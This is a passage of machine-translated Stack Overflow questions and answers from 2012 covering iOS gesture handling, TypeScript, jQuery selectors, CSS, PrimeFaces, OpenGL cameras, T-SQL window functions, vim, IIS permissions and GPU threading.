    CGFloat x = location.x;
    NSLog(@"testing = %f", (double)x);
} 
```

这是我在不同位置的几个水龙头的输出：

```
2012-10-24 22:49:53.077 TicTacToe[15561:f803] testing = 0.000000
2012-10-24 22:49:53.971 TicTacToe[15561:f803] testing = 0.000000
2012-10-24 22:49:54.671 TicTacToe[15561:f803] testing = 0.000000 
```

很明显，我的 singleFingerTap 方法被调用了，但是位置一直说 X 坐标的位置是 0。我是一个 Objective-C 新手，所以这可能是一个新手错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T16:09:15.433

这就是我修复它的方法：

```
- (void)handleSingleTap:(UITapGestureRecognizer *)recognizer 
{
    CGPoint location = [recognizer locationInView:[recognizer.view self]];
    CGFloat x = location.x;
    NSLog(@"testing = %f", (double)x);
} 
```

我需要在我有超级视图的地方添加自我

# typescript - typescript (.ts) 和它的 javascript (.js) 之间的关系是如何维护的？

> ID：13061315
> 
> 赞同：2
> 
> 时间：2012-10-25T03:53:24.797
> 
> 标签：typescript

我有一个打字稿项目工作正常。我创建了第二个项目并通过文件系统复制了一些我以前的代码。一切正常，除了我的 .js 现在与我的 .ts 不同步。我现在如何解决这个问题：通过拖动 ts 文件（将自动携带 .js）删除这两个文件并使用 Visual Studio 界面再次复制 无论如何，我很好奇，现在我想知道，.ts 怎么样和.js 互相认识？在 ASP.NET 中，您有代码背后的概念。但在这里我看不到这是如何完成的。Visual Studio 是否将关系保存在隐藏文件中？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T05:59:34.037

在第 75 页（第 9.1 章）的打字稿语言规范中：

> 默认情况下，编译中的每个实现源文件都会生成一个 JavaScript 输出文件，但不会从声明源文件生成输出。

除了名称之外，ts 和 js 文件之间没有真正的关联。一个 ts 文件被编译成一个 js 文件，并在运行时加载 js 文件。请注意，js 文件的实际命名与模块名称无关，您自己负责相应地加载脚本（例如，`<script>`在您的 html 页面中使用）。

在您的情况下，只需复制并添加对 ts 文件的引用就可以了。添加引用后，请务必将 Build Action 更改为“TypeScriptCompile”以确保将其传递给 typescript 编译器：在解决方案资源管理器中选择文件，按 F4 调出属性窗口并更改 Build Action。

更新：要使文件“嵌套”，如评论中所述，您可以卸载项目并将子元素添加到 js 元素，例如转换

```
<Content Include="some.js" />
<TypeScriptCompile Include="some.ts" /> 
```

到

```
<Content Include="some.js">
    <DependentUpon>some.ts</DependentUpon>
</Content>
<TypeScriptCompile Include="some.ts" /> 
```

# namespaces - 如何在 dokuwiki 中选择命名空间和页面名称，以便 indexmenu 和 pagenav 与 useheading 很好地配合使用？

> ID：13061317
> 
> 赞同：4
> 
> 时间：2012-10-25T03:53:31.867
> 
> 标签：namespaces, dokuwiki

我即将将以前保存在 pdf 中的用户手册移动到 dokuwiki。在开始移动所有内容之前，我想确保我可以让以下组件很好地交互：

indexmenu，useheading，pagenav，bookcreator。

在我的小规模测试中，到目前为止，我无法达到我想要的效果。

**目标：**我想要侧边栏导航以及每一页上的下一步和前进按钮，它们的导航方式就像你在书中所期望的那样。

我有两个主要部分，每个部分都包含许多命名空间（我认为它们是包含小节的部分）和页面（现在没有小节，但将来可能会有一些）。

从长远来看，我想使用 bookcreator 来使用侧边栏中的订单。

我给你画了一张照片，但不允许发布，所以这里是一个链接：

[http://images.labtutor.com/images/pagenav.png](http://images.labtutor.com/images/pagenav.png)

**采取的步骤：**我打开了 useheadings（它使“你在这里”导航变得漂亮），使用了 indexmenu 和 pagenav，并启动了所有带有 010、020、030 等前缀的页面和命名空间。

在我的示例中，010 和 020 只是页面，030 是一个命名空间，在该命名空间中有两个页面。

**我得到的（但不想要**的）： indexmenu 首先使用 030 命名空间构建侧边栏，然后是 pages。页面按字母顺序排序，而不是按前缀排序。排序选项对我来说意义不大，我已经玩了一段时间但没有成功。

[http://images.labtutor.com/images/pagenavbad.png](http://images.labtutor.com/images/pagenavbad.png)

当我希望它进入一个小节（命名空间中的页面）时，pagenav 不会进入命名空间。这意味着如果我得到这个：

介绍页面（点击下一步 ->） 如何开始（点击下一步 ->） 一些细节（点击下一步 ->） 故障排除。

我怀疑我对如何使用页面和名称空间有根本的误解，或者......好吧，否则。

谢谢你的帮助！

# html - 在 Wordpress 中通过 CSS 将徽标居中

> ID：13061318
> 
> 赞同：0
> 
> 时间：2012-10-25T03:53:54.910
> 
> 标签：html, css, wordpress, themes, margin

我正在尝试在 Wordpress 上的 Canvas 中将网站徽标（[此处）居中。](http://rainleader.com)我正在使用这个 CSS：

```
#logo img {
display: block;
margin-left: auto;
margin-right: auto;
} 
```

不幸的是，它不起作用。不过，我可以像这样手动移动徽标：

```
#logo img {
display: block;
margin-left: 330px;
} 
```

但是，通过使用左边距强制它，它会破坏移动网站（将徽标移动 3 英寸超过需要滚动）。

解决这个问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:07:09.630

在您的站点中，一个 id = 'logo' 的元素已被 css 浮动到左侧。

删除`float:left`此元素的声明。

# jsf - Primefaces 双重组合选择

> ID：13061319
> 
> 赞同：1
> 
> 时间：2012-10-25T03:54:11.030
> 
> 标签：jsf, primefaces

修改.xhtml

```
 <table border="0" align="left" cellpadding="10" cellspacing="0">
                 <tr>   
                    <td>通訊地址 : </td>
                    <td><p:selectOneMenu value="#{modify.comAddressContry}" style="width: 120px">
                            <f:selectItem itemLabel="--選擇城市--" itemValue="--選擇城市--"/>
                            <f:selectItems value="#{modify.tw.country_map}"/>
                            <p:ajax update="district_change_com"  event="change" listener="#{modify.com_country_change()}"/>
                        </p:selectOneMenu>
                    </td>
                    <td><p:selectOneMenu id="district_change_com" value="#{modify.comAddressDistrict}" style="width: 120px">
                            <f:selectItem itemLabel="--選擇地區--" itemValue="--選擇地區--" />
                            <f:selectItems value="#{modify.tw.district_map}"/>
                            <p:ajax update="com_all" listener="#{modify.com_zipcode_change()}"/>
                        </p:selectOneMenu>                          
                    </td>
                    <td><p:inputText id="com_all" value="#{modify.comAddressAll}" style="width: 300px"/></td>
                    <td>通訊地電話 : </td>
                    <td><p:inputText value="#{modify.houseAddressTel}" maxlength="11" /></td>
                </tr>
                <tr>   
                    <td>戶籍地址 :</td>
                    <td><p:selectOneMenu value="#{modify.houseAddressContry}" style="width: 120px">
                            <f:selectItem itemLabel="--選擇城市--" itemValue="--選擇城市--"/>
                            <f:selectItems value="#{modify.tw.country_map}"/>
                            <p:ajax update="district_change"  event="change" listener="#{modify.country_change()}"/>
                        </p:selectOneMenu>
                    </td>
                    <td><p:selectOneMenu id="district_change" value="#{modify.houseAddressDistrict}" style="width: 120px">
                            <f:selectItem itemLabel="--選擇地區--" itemValue="--選擇地區--" />
                            <f:selectItems value="#{modify.tw.district_map}"/>
                            <p:ajax update="house_all" listener="#{modify.zipcode_change()}"/>
                        </p:selectOneMenu>                          
                    </td>
                    <td><p:inputText id="house_all" value="#{modify.houseAddressAll}" style="width: 300px"/></td>
                    <td>戶籍地電話 : </td>
                    <td><p:inputText value="#{modify.houseAddressTel}" maxlength="11" /></td>
                </tr>
            </table> 
```

我正在尝试 PrimeFaces 中的双重组合选择功能。当我使用它一次时效果很好，但是当我在同一个页面（以相同的形式）中使用它两次时，当我提交所选数据时页面显示验证错误。对这个问题有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T11:04:15.727

如果 bean 是请求范围的，因此会在每个 HTTP 请求上重新创建（注意每个 ajax 请求也算作一个单独的 HTTP 请求），则可能会发生这种情况。每次提交时，JSF 都会根据可用项目列表验证提交的下拉值。但是，如果 bean 是请求范围的，则此列表将每次都重新初始化为默认值。因此，如果级联下拉列表的默认初始化列表不代表用户提交表单时的正确列表，那么您将收到“验证错误：值无效”。

将 bean 放置在视图范围内，这样只要您与同一个视图交互（也通过 ajax 请求），它就会存在，应该可以解决问题。

```
@ManagedBean
@ViewScoped
public class Modify {
    // ...
} 
```

### 也可以看看：

*   [如何选择合适的bean范围？](https://stackoverflow.com/questions/7031885/how-to-choose-the-right-bean-scope)

# jquery - jQuery过滤器/选择器

> ID：13061323
> 
> 赞同：0
> 
> 时间：2012-10-25T03:54:41.013
> 
> 标签：jquery

```
<span class="one">
    <span class="two">
        <span class="Three">
                <span class="Four">
                <a href=''>1</a>
                <a href=''>2</a>
                <a href=''>3</a>
                </span>
        </span>
    </span>
</span> 
```

我想从中选择第一个 `a`标签`span class="one"` 这是正确的语法吗？

```
$('span.one > a:firstchild') 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T03:55:43.847

试试这个 。你错过`-`了第一个和孩子之间。这是访问直接孩子

```
 $('span.one > a:first-child') 
```

参考：[第一个孩子](http://api.jquery.com/first-child-selector/)

**或者**

你想`a`从 span.one 里面选择 span.four

```
 $('span.one a:first-child') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T04:01:05.797

使用`a:first-child`或`a:first`两者都应该工作

```
$('span.one a:first-child'); //or
$('span.one a:first') 
```

# javascript - 无法确定要使用的 jquery 选择器

> ID：13061324
> 
> 赞同：0
> 
> 时间：2012-10-25T03:54:43.283
> 
> 标签：javascript, jquery

我有以下代码，基本上：

```
<form>
 <p class="comment-form-comment"> <textarea id="comment" ></textarea> </p>
    <p class="form-submit" style="display: none;"><input id="submit" value="submit" type="submit"></input> </p>
</form> 
```

我有以下 javascript：

```
jQuery('form').on('click','p.comment-form-comment', function(){

jQuery("p.form-submit").css('display', 'block');

    });​ 
```

该表单是一个循环项目，我正在尝试选择属于单击的文本区域的提交按钮，而不是所有按钮。我似乎无法绕开它，尽管它似乎很容易。

我在这里设置了一个 jsFiddle：http: [//jsfiddle.net/ZJx3k/1/](http://jsfiddle.net/ZJx3k/1/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:00:39.213

```
jQuery('form').on('focus', 'textarea', function() {
    // hide other submit buttons
    jQuery('.form-submit').hide();

    // show the right one
    jQuery(this).closest('form').find('.form-submit').css('display', 'block');
});​ 
```

**[http://jsfiddle.net/ZJx3k/6/](http://jsfiddle.net/ZJx3k/6/)**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T04:05:54.973

```
$('form p.comment-form-comment').click(function(){
    $(this).next('p.form-submit').show();
});​ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T04:05:24.653

采用`jQuery(this).find('p.form-submit')`

示例：http: [//jsfiddle.net/ZJx3k/4/](http://jsfiddle.net/ZJx3k/4/)

您可以`jQuery.next()`按照 KaeruCT 的建议使用，但是您将依赖于您的 HTML 结构保持不变

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T03:58:29.280

您可以使用`jQuery.next()`

见这里：http: [//jsfiddle.net/ZJx3k/2/](http://jsfiddle.net/ZJx3k/2/)

# c++ - OpenGL 和 SFML 中的 3d 相机

> ID：13061334
> 
> 赞同：-4
> 
> 时间：2012-10-25T03:56:18.463
> 
> 标签：c++, opengl, 3d, camera

我试图让我在 OpenGL 中的场景移动，但我遇到了麻烦。我查阅了几个教程，了解了 OpenGL 矩阵背后的数学概念。我只是遇到了麻烦。我需要的只是1个例子。如果我能看到一个例子，说明当一个键被按住时“相机”是如何向一个方向移动的，我可以为自己的目的修改代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T06:02:12.543

好吧，OpenGL 并没有真正的“相机”。它拥有的是一个转换管道（固定功能或可编程）。此外，OpenGL 不维护“场景”，而只是将点、线和三角形绘制到帧缓冲区，一次一个。

一旦你把注意力集中在一个事实上，你本质上与使用任何其他绘图 API（`goTo(x,y); lineTo(x,y);`或类似的 API）并没有太大的不同，OpenGL 中的很多东西都会变得更有意义。

因此，OpenGL 中的“相机”只是在顶点变换管道中的某个点应用的视图变换。通常作为模型视图矩阵中的最后一个转换——模型转换之后是视图转换，因此是模型视图。

有很多方法可以指定视图转换，通常用于此的典型辅助函数是`gluLookAt`. 由于转换以相反的顺序应用，因此它们被乘以矩阵（如果至少使用 OpenGL 的 glMultMatrix 或内置矩阵操作函数之一），在定义模型视图矩阵时，查看转换首先出现。因此，在您的绘图功能中，代码通常看起来像

```
glMatrixMode(GL_MODELVIEW)
glLoadMatrix(view.transformation) # same as glLoadIdentity(); glMultMatrix(view.transformation)

foreach(object o in objects):
    glMatrixMode(GL_MODELVIEW)
    glPushMatrix()
    glMultMatrix(o.transformation)

    o.draw()

    glMatrixMode(GL_MODELVIEW)
    glPopMatrix() 
```

您是否注意到在每次矩阵操作之前我总是确保我处于正确的矩阵模式？这是因为 object::draw 可能会切换到另一种矩阵模式（比如 GL_TEXTURE），而切换矩阵模式的成本可以忽略不计，所以你应该总是在一系列矩阵操作之前这样做。

作为进一步的提示：您应该始终将设置视口和投影矩阵的代码放在绘图代码的开头。*不要*将它放在窗口的调整大小事件处理程序中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T04:33:13.717

您可以使用`gluLookAt`“移动”您的相机。

```
gluLookAt(eyex,eyey,eyez, centerx,centery,centerz, upx,upy,upz); 
```

它们的前 3 个坐标是您的虚拟眼睛的坐标。接下来的 3 个是您的眼睛“注视”的坐标。最后 3 个是指向场景向上方向的向量（将其视为旋转您的眼睛）。

例如，

```
gluLookAt(1,1,1, 0,0,0, 0,1,0); 
```

这使您的眼睛注视着 (1,1,1) 并且您正在查看原点。向上向量的方向是正 y 轴。

如果你想移动相机，你可以`gluLookAt`在每次按键回调函数中按下一个键时调用更新的参数。

# jquery - 如何使用jquery检测已选择的特定组选项组

> ID：13061335
> 
> 赞同：0
> 
> 时间：2012-10-25T03:56:30.217
> 
> 标签：jquery, html

这是我遇到的一个非常小的问题。以下是我的 html 选择标签

```
<select id="category" name="category" style="opacity: 0; ">             
                <optgroup label="Default">  
                    <option value="Finance">Finance</option>
                    <option value="IT">IT</option>
                </optgroup>
                <optgroup label="User Created">             
                    <option value="Categoy">Categoy</option>
                    <option value="My Category">My Category</option>
                </optgroup>
      </select> 
```

当用户选择用户创建标签 optgroup 中的选项时，我必须显示一个按钮。谁能给我一个建议如何用jquery做

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T04:07:40.803

小提琴：http: [//jsfiddle.net/tariqulazam/27RLj/](http://jsfiddle.net/tariqulazam/27RLj/)

**HTML**

```
<select id="category" name="category" style="opacity: 1; ">             
   <optgroup label="Default">  
         <option value="Finance">Finance</option>
         <option value="IT">IT</option>
   </optgroup>
   <optgroup label="User Created">             
         <option value="Categoy">Categoy</option>
         <option value="My Category">My Category</option>
   </optgroup>
</select>

<input type="button" value="button" id="btn"/>​ 
```

**代码**

```
$(document).ready(function(){
    $("#btn").hide();

    $("#category").change(function(){
        var selected = $("option:selected", this);
        selected.parent()[0].label=="User Created"?$("#btn").show(): $("#btn").hide();     

    });

});​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:11:52.220

*HTML*

```
 <select id="category" name="category" style="opacity: 1; ">             
            <optgroup label="Default">  
                <option value="Finance">Finance</option>
                <option value="IT">IT</option>
            </optgroup>
            <optgroup label="User Created">             
                <option value="Categoy">Categoy</option>
                <option value="My Category">My Category</option>
            </optgroup>
  </select>
 <input id="btn" type="button" style="display:none" value="Press Me" /> 
```

*脚本*

```
 $(document).ready(function() {
    $("select").change(function() {
    var clicked = $(this)
                     .find('option:selected') // get selected option
                     .parent()   // get that option's optgroup
                     .attr("label");   // get optgroup's label
       if( clicked == "User Created")
       {
         $('#btn').css('display','');
        }
        else
        {
            $('#btn').css('display','none');
        }
    });
}); 
```

看看这个[小提琴](http://jsfiddle.net/NWDC8/23/)

# sql-server - 如何计算 TSQL 中另一列中每个值的模式

> ID：13061336
> 
> 赞同：3
> 
> 时间：2012-10-25T03:56:34.040
> 
> 标签：sql-server, sql-server-2008, tsql, window-functions

我有一张这样的桌子：

```
ID   Group  Gender
------------------
1    A      M
2    A      M
3    A      F
4    A      M
5    A      U
6    B      F
7    B      F
8    B      M
9    C      U
10   C      F
11   C      U 
```

我正在尝试计算每种性别的**模式组**。换句话说，对于每个性别，告诉我哪个是最受欢迎的群体。所以我想要的结果如下：

```
Gender  ModeGroup
-----------------
M       A          (because 3 males in group A, 1 in B and 0 in C)
F       B          (because 2 females in group B, 1 in A and 1 in C)
U       C          (because 2 unknown in group C, 0 in B and 1 in C) 
```

在平局的情况下，我需要为每个平局组返回一个记录。

如何在 TSQL 中优雅地做到这一点？我想我需要使用一个窗口功能，但我一直在努力解决它。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T05:03:52.333

这是我的无 CTE 解决方案：

```
SELECT
  Gender,
  [Group]
FROM
  (
    SELECT
      [Group],
      Gender,
      RANK() OVER(PARTITION BY Gender ORDER BY [Count] DESC) AS [Rank]
    FROM
      (
        SELECT [Group], Gender, SUM(1) AS [Count]
        FROM GroupGender
        GROUP BY [Group], Gender
      ) AS counts
  ) AS ranks
WHERE
  [Rank] = 1 
```

SQL Fiddle 演示：[No ties](http://www.sqlfiddle.com/#!3/ace11/9/0)和[With ties](http://www.sqlfiddle.com/#!3/6628f/1/0)

更新：（见评论）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T04:12:51.890

```
Declare @t Table(Id Int Identity, [Group] Varchar(1),Gender Varchar(1))
    Insert Into @t Values
    ('A','M'),('A','M'),('A','F'),('A','M'),('A','U'),
    ('B','F'),('B','F'),('B','M'),
    ('C','U'),('C','F'),('C','U')

;With Cte As 
(
    Select 
        [Group]
        ,Gender
        ,GenderCount = Count(Gender)
    From @t
    Group By [Group],Gender
)

Select Gender,ModeGroup = [Group]
From (
        Select 
            *,
        Rn = Dense_Rank() Over(Partition by [Group] order by [Group],GenderCount desc)
        from Cte
     )X
Where Rn =1 
```

**结果**

```
Gender  ModeGroup
M       A
F       B
U       C 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T04:05:46.533

使用公用表表达式，

```
WITH results
AS
(
    SELECT  Gender, 
            [GROUP], 
            COUNT(*) totalCount,
            ROW_NUMBER() OVER (Partition BY Gender ORDER BY COUNT(*) DESC) a
    FROM table1
    GROUP BY Gender, [GROUP]
)
SELECT Gender, [GROUP]
FROM RESULTs
WHERE a = 1
-- ORDER BY [GROUP] 
```

# [SQLFiddle 演示](http://sqlfiddle.com/#!3/36504/12)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T04:06:02.507

像这样的东西怎么样

```
;WITH Vals AS (
        SELECT  Gender,
                [Group],
                COUNT([Group]) Cnt
        FROM    Table1
        GROUP BY Gender,
                [Group]
)
, ValsID AS (
        SELECT  *,
                ROW_NUMBER() OVER (PARTITION BY Gender ORDER BY Cnt DESC) RowID
        FROM    Vals
)
SELECT  Gender,
        [Group]
FROM    ValsID
WHERE   RowID = 1 
```

## [SQL 小提琴演示](http://www.sqlfiddle.com/#!3/36504/9/0)

# vim - 在vim中使用find指令后如何关闭突出显示

> ID：13061339
> 
> 赞同：11
> 
> 时间：2012-10-25T03:57:04.533
> 
> 标签：vim

在 vim 中使用 /string 找到目标词后，突出显示变得烦人，任何人都可以告诉我关闭突出显示的最快方法是什么？谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-25T03:57:45.730

最简单的方法是输入`:noh`命令。

此外，您可以将此行添加到您的`.vimrc`以将该命令映射到`Enter`键，因此您可以在搜索后简单地按下`Enter`以清除突出显示：

```
:nnoremap <CR> :noh<CR><CR> 
```

*   [vim clear last search 高亮显示](https://stackoverflow.com/questions/657447/vim-clear-last-search-highlighting)
*   [*您真的*不能错过的 Vim 和 ViEmu 映射- 再也不用输入`:noh`了！](http://www.viemu.com/blog/2009/06/16/a-vim-and-viemu-mapping-you-really-cant-miss-never-type-noh-again/)

# c# - DataTrigger 如何绑定 Mouse.Leave 命令

> ID：13061342
> 
> 赞同：1
> 
> 时间：2012-10-25T03:57:15.367
> 
> 标签：c#, wpf

```
<TextBox Text="" x:Name="txtName"/>
      <Button Content="Click">
          <Button.Style>
              <Style TargetType="Button">
                  <Style.Triggers>
                      <DataTrigger Binding="{Binding ElementName=input, Path=Text}" Value="1">
                          <Setter Property="Mouse.Leave" Value="{Binding OnAdd}"></Setter>
                      </DataTrigger>
                      <DataTrigger Binding="{Binding ElementName=input, Path=Text}" Value="2">
                          <Setter Property="Mouse.Leave" Value="{Binding OnAddMove}"></Setter>
                      </DataTrigger>
                  </Style.Triggers>
              </Style>
          </Button.Style>
      </Button> 
```

按钮 Click(Property=Command) 由 txtName 工作；但是 MouseLeave 不起作用

# sql-server-2012 - 获取 SQL 过程结果集信息

> ID：13061343
> 
> 赞同：0
> 
> 时间：2012-10-25T03:57:26.100
> 
> 标签：sql-server-2012

对于 SQL Server 2012，知道如何在不运行 SQL 存储过程的情况下获取结果吗？

我发现最接近的 find 来自 sp_depends ，它有一个选定的但即使它在 where 语句中它也会给我结果。

希望找到一种方法来查找选择了哪些列，但不是在 where 语句中。

让我重新表述一下：我不需要数据，只需要它返回的列，所以我可以通过 T4 创建我的结果类。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-15T15:32:56.587

无论您在 SP 中尝试做什么，都可以在函数中实现。您可以在自定义函数中执行许多与简单存储过程相同的操作，但函数不像存储过程那样“运行”（即 exec sp_blah）

我可以创建这样的函数：

```
 create function CustomAdd @i int, @ii int
 returns int
 as 
 return (@i + @ii) 
```

然后任何时候我想使用它，我都会写如下内容：

```
select CustomAdd(343,4343) 
```

# jquery-ui - Jquery UI - 初始化后在日期选择器上设置日期

> ID：13061348
> 
> 赞同：0
> 
> 时间：2012-10-25T03:58:14.163
> 
> 标签：jquery-ui, datepicker, initialization, jquery-ui-datepicker

所以我很清楚如何手动更改日期选择器中的日期。当我在页面加载后尝试初始化日期选择器然后尝试更改日期时，问题就出现了。

这是我所指的[http://jsfiddle.net/nosfan1019/2VBLZ/2/](http://jsfiddle.net/nosfan1019/2VBLZ/2/)的小提琴。

HTML

```
<a href="#" class="show">click to show</a>
<a href="#" class="set">Jan 9</a>
<br>
<div class="insert"></div> 
```

​ JS

```
$('a.show').click(function() {
   $(".insert").datepicker();    
});

$('a.set').click(function() {
   $('#datepicker').datepicker('setDate','01/09/13');       
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:05:33.757

您的第二次点击事件会更改您似乎没有的 div ( `$('#datepicker')`)。如果您将其更改为`$(".insert")`，它将正常工作。

**[jsFiddle 示例](http://jsfiddle.net/j08691/2VBLZ/4/)**

```
$('a.show').click(function() {
    $(".insert").datepicker();    
});

$('a.set').click(function() {
    $(".insert").datepicker('setDate','01/09/2013');       
}); 
```

​</p>

# security - IIS 7.5 ISAPI 应用程序池安全性

> ID：13061349
> 
> 赞同：1
> 
> 时间：2012-10-25T03:58:23.587
> 
> 标签：security, iis, iis-7.5, isapi

我在 IIS 7.5 下运行 ISAPI dll，并希望使用 Bill Egge 的 ISAPI Loader dll，这样可以在不停止服务器的情况下换出更新的 dll。

如果我将保存 DLL 的目录上的安全设置为“所有人”并使用“完全控制”，那么它会按设计工作（带有 *.update 扩展名的 dll 会自动导致现有的 *.run dll 被备份，而新的dll 以 *.run 扩展名重命名）。

显然，我不希望使用“每个人”帐户，因为这会破坏安全性。所以我删除了“所有人”的权限。

我的应用程序在应用程序池 - “TestAppPool”下运行。[我在IIS7 Permissions Overview - ApplicationPoolIdentity](https://stackoverflow.com/questions/7334216/iis7-permissions-overview-applicationpoolidentity)中遵循了最受好评的答案， 并将用户“IIS AppPool\TestAppPool”的安全性添加到“完全控制”。但是，这不允许 *.update dll 覆盖 *.run dll。

谁能指出我正确的方向。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T22:59:54.577

感谢 Rich，答案是在托管 isapai dll 的目录上授予 IUSR 帐户的修改权限。

# javascript - 哪些本地构造函数不能通过全局对象访问？

> ID：13061350
> 
> 赞同：3
> 
> 时间：2012-10-25T03:58:24.740
> 
> 标签：javascript, native-code

在[这个问题](https://stackoverflow.com/questions/3955984/need-comprehensive-list-of-all-native-objects)中，建议为了让所有本机对象使用全局对象。然而，答案是不完整的，因为还有其他本机对象无法通过全局对象访问。

我知道至少有一个——`Arguments`它没有来自全局对象的引用。还有哪些其他构造函数不能通过全局对象访问？

这个问题不仅限于浏览器，还可能包括 Node。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T03:07:07.860

当您列出全局对象上引用的所有对象时，这将包括[本机对象](http://es5.github.com/#x4.3.6)（核心语言对象）和[宿主对象](http://es5.github.com/#x4.3.8)（由宿主环境提供；在浏览器中，所有 DOM 内容等等）。这就是我们可以在代码中使用的全部内容。

该列表中没有`Arguments`构造函数。可能有，但没有：

> arguments 对象是通过调用抽象操作 CreateArgumentsObject [ECMAScript 5.1, Section 10.6创建的](http://es5.github.com/#x10.6)

粗略地说，该操作创建了一个常规`Object`（标准构造函数，标准原型），用一些额外的属性（如 ）对其进行扩展`length`，并将其`[[Class]]`内部属性设置为`"Arguments"`。`arguments.toString()`这就是为什么`[object Arguments]`。

# javascript - 使用 javascript 传递站点属性

> ID：13061351
> 
> 赞同：1
> 
> 时间：2012-10-25T03:58:26.590
> 
> 标签：javascript, jquery, html, properties, jquery-selectors

所以我有点想出一种转变方式来做网站属性，但我想知道是否有办法改进我的方法。目标是拥有 1 个 html 文件，我的客户将能够在其中使用 cms 工具并更新网站上的常见值，例如重复的标题、感谢消息、公司名称等。我想使用 Javascript 来完成此操作。

```
var spSelectResultsTxt = $("#sp .selectResultsTxt");
$(".main-content .selectResultsTxt").text(spSelectResultsTxt.text());​ 
```

这是一个活跃的小提琴，[http://jsfiddle.net/trobbins26/VwtWD/4/](http://jsfiddle.net/trobbins26/VwtWD/4/)

该脚本将文本值从一个 div（客户端将在 cms 中更新）传递给站点中某个页面上的类。唯一的问题是我不想为网站上可能存在的每个属性创建一个 var。

我的脚本中有没有办法说[如果#sp .class 与.main-content .class 匹配，则将#sp .class 中的文本应用为.main-content .class 中的文本？本质上是创建一个可以应用于我创建的每个属性的规则。

任何反馈都会有所帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:47:07.837

这可以解决问题：

HTML：

```
<!-- Represents html file that will be updated in a cms by client -->
<!-- To be included on each page of site -->
<div id="sp" style="display:none;">
    <span data-target=".main-content .selectResultsTxt">
        Select an option to see results for a specific year.    
    </span>
    <div data-target="#otherText">Some other text.</div>
</div>

<!-- represents page to apply rule -->
<div class="main-content">
    <h4><span class="selectResultsTxt"></span> testing...</h4>
    <p><span id="otherText"></span></p>
</div> 
```

Javascript：

```
$('#sp').children().each(function() {
    $($(this).data().target).text($(this).text());
}); 
```

在这里更新小提琴：http: [//jsfiddle.net/VwtWD/7/](http://jsfiddle.net/VwtWD/7/) ​</p>

解释：

您只需遍历 的子元素`div.sp`，然后访问其类和文本，然后在页面上寻找匹配的元素进行更新。

我做了一些改进：

最好留下用于识别目标元素的类，并在存储用户输入文本的元素上使用数据绑定。`.data()`就像我上面的解决方案一样，它可以通过 jQuery 函数轻松访问。

能够为每个元素指定完整的 CSS 路径可能也很好，因此您可以将解决方案扩展到更复杂的页面。

就我个人而言，我也会使用该`.html()`方法来设置 html，而不仅仅是文本，以防客户端想要使用`<br>`标签 or `<em>`or`<img>`等​​。示例：

```
$('#sp').children().each(function() {
    $($(this).data().target).html($(this).html());
}); 
```

其他反馈：

您是否有理由使用客户端 javascript 来实现这一目标？您可以很容易地在服务器端执行此操作（即使在带有 node.js 的 javascript 中），这将有很多好处，包括 - Google 等不会看到对 SEO 来说是个问题的内容 - 没有 javascript 的浏览器赢了'看不到内容（诚然，这是一个非常小的数字，因此可能不是问题，但值得指出）

无论如何，作为一种快速破解解决方案，它是有效的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T04:40:50.677

像这样的东西应该做你想做的事。它将按顺序遍历所有具有类的元素。如果一个元素有多个类，它将匹配具有所有相同类的元素。它不过滤重复项，因此如果一个元素被多次匹配，最后一个匹配项会覆盖任何以前的匹配项。

```
// save main element
var main = $( '.main-content' );

// for each element in #sp with a class
$( '#sp *[class]' ).each( function() {
    // get all the classes on the element, and make a jQuery selector from them
    var selector = '.' + this.getAttribute( 'class' ).replace( ' ', '.' );

    // find any matching elements in the main element, and set the text
    main.find( selector ).text( $( this ).text() );
}); 
```

编辑：这是一个演示：http: [//jsfiddle.net/VwtWD/6/](http://jsfiddle.net/VwtWD/6/)

# image-processing - GPU 上的线程

> ID：13061353
> 
> 赞同：1
> 
> 时间：2012-10-25T03:58:33.407
> 
> 标签：image-processing, directx, gpgpu, directcompute

我正在使用 DirectCompute 在 GPU 上进行一般计算。目前，我正在尝试对分辨率为 1920x1080 的纹理进行操作。我有一个 Dispatch(2, 1080, 1) 和 numthreads(960, 1, 1) 根据我的计算，它们准确地覆盖了我的图像，每个像素一个线程。

现在，据我了解，所有线程都应该同时运行，对吧？但是，在我的代码中，如果像素为黑色，我不会进行任何计算。因此，当我的大部分图像为黑色时，我注意到性能明显提高。但是，如果一个物体挡住了屏幕，性能就会急剧下降。

我的问题是：如果所有线程都并行运行，处理一帧的速度将由性能最差的线程决定，本质上运行在黑色像素上的线程将处于空闲状态，对吧？那么，为什么在处理更多像素时我会看到速度变慢？他们应该同时这样做。还是我把这一切都搞错了？

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T09:28:52.133

